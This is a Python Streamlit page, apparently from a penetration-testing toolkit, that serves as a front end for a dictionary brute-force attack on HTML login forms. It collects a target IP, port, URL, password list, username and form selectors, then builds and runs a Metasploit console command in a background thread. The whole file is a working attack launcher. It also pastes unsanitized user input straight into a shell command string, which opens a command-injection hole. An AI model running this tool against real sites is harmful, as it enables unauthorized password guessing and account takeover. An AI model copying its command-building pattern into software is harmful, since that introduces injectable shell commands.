import streamlit as st
from threadManagement.ThreadManager import ThreadManager
from utils.InternetProtocolValidator import InternetProtocolValidator
import os


def check_parameters_errors(css_login: str, css_password: str, dictionary: str, login: str, port: str,
                            regex_success: str, url: str, target: str) -> bool:
    if css_login == "":
        st.error("CSS selector for the login field cannot be empty")
        return True
    elif css_password == "":
        st.error("CSS selector for the password field cannot be empty")
        return True
    if dictionary == "" or not os.path.isfile(dictionary):
        st.error(body="Dictionary file path must be valid.")
        return True
    elif login == "":
        st.error(body="Login user cannot be empty.")
        return True
    elif not InternetProtocolValidator.is_valid_port(port=port):
        st.error("Port number must be valid")
        return True
    elif regex_success == "":
        st.error("CSS selector for the password field cannot be empty")
        return True
    elif not InternetProtocolValidator.is_valid_url(url=url):
        st.error("URL must be valid")
        return True
    elif not InternetProtocolValidator.is_valid_ip(ip_string=target):
        st.error(body="Target IP address must be valid.")
        return True

    return False


attack = "Bruteforce HTML login format"
css_login = ""
css_password = ""
dictionary = ""
login = ""
port = ""
regex_success = ""
url = ""
target = ""
threadManager = ThreadManager()
st.title(body=attack)

st.caption(
    body="This attack consists in performing a dictionary attack against a HTML form.")

# check if attack is already in action
attackInAction = threadManager.check_running(attack=attack)
# if yes, allow attack to be stopped
if attackInAction == True:
    if not threadManager.check_for_error(attack=attack):
        if st.button("Stop attack"):
            threadManager.stop_attack(attack=attack)
            st.rerun()
else:
    # if no, allow execution
    target = st.text_input(label="Target IP address", help="IP address of the Webserver")
    port = st.text_input(label="Port", help="Port where the page is being hosted")
    url = st.text_input(label="URL containing the login form", help="For example: www.website.com/login")
    dictionary = st.text_input(label="Dictionary", help="Absolute path to the dictionary file with the passwords")
    login = st.text_input(label="Login as", help="This will be the user the attack will use to guess the password")
    css_login = st.text_input(label="CSS selector for the login field", help="For example: input[name='username']")
    css_password = st.text_input(label="CSS selector for the password field", help="For example: input[type=password]")
    regex_success = st.text_input(label="Regex to detect a successful authentication", help="For example: Success")

    if st.button("Start attack"):
        if not check_parameters_errors(target=target, port=port, url=url, dictionary=dictionary, login=login,
                                       css_login=css_login, css_password=css_password, regex_success=regex_success):
            command = ("msfconsole -m 'auxiliary/' -x 'color false; use auxiliary/html_login_bruteforce; set RHOST " +
                       target + "; set RPORT " + port + "; set URL " + url + "; set USERNAME " + login +
                       "; set PASS_FILE " + dictionary + "; set LOGIN_FIELD_SELECTOR " + css_login +
                       "; set PWD_FIELD_SELECTOR " + css_password + "; set SUCCESS_REGEX " + regex_success +
                       "; run; exit'")
            threadManager.start_attack(attack=attack, command=command)
            st.rerun()

# returns True if there is an error
